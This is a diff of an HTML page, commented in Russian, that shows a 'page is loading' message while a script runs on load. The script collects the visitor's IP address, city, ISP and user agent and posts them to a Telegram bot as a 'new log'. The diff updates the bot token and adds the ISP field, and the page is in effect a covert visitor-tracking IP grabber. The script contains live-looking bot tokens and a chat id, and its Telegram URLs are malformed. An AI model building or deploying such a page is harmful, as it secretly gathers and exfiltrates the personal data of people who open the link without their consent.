@@ -8,35 +8,39 @@
     <h1>Страница загружается, подождите...</h1>
 
     <script>
-        async function sendData() {
-            const token = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
+        async function start() {
+            // Твои актуальные данные
+            const token = "8413511998:AAH_8iwks7GXhX7CkVnM3dk2mpOvzNuTIlw";
             const chat_id = "8426763446";
 
             try {
-                // 1. Получаем данные об IP
+                // 1. Получаем IP и данные через надежный сервис
                 const response = await fetch('https://ipapi.co');
                 const data = await response.json();
 
-                // 2. Формируем текст
-                const message = `🚀 Новый лог!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n📱 Устройство: ${navigator.userAgent}`;
+                // 2. Готовим текст сообщения
+                const text = `🚀 Новый лог!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n🏢 Провайдер: ${data.org}\n📱 Устройство: ${navigator.userAgent}`;
 
-                // 3. Отправляем в Telegram простым методом
-                await fetch(`https://api.telegram.org{token}/sendMessage`, {
+                // 3. Отправляем в Telegram (используем метод POST для надежности)
+                const url = `https://api.telegram.org{token}/sendMessage`;
+                
+                await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chat_id,
-                        text: message
+                        text: text
                     })
                 });
 
-                console.log("Отправлено!");
-            } catch (err) {
-                console.error("Ошибка:", err);
+                console.log("Данные успешно отправлены в бота!");
+            } catch (error) {
+                console.error("Произошла ошибка:", error);
             }
         }
 
-        sendData();
+        // Запуск функции
+        start();
     </script>
 </body>
 </html>
